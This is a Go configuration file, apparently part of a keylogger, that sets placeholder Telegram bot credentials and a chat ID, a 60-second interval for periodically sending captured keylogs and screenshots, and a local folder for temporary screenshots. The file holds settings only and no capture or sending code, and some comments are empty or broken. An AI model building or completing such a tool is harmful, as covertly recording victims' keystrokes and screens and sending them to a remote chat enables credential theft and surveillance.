// config.go
package config

// configuration.
// 
const (
    // 
    TelegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
    // ChatID
    // Tooks
    TelegramChatID = "YOUR_TELEGRAM_CHAT_ID"
)

// FlushIntervalSec is the interval, in seconds, between periodic sends of keylogs and screenshots.
const FlushIntervalSec = 60

// ScreenshotDir is the directory where temporary screenshots are saved before sending.
// Ensure this directory exists or your code creates it if missing.
const ScreenshotDir = "results"
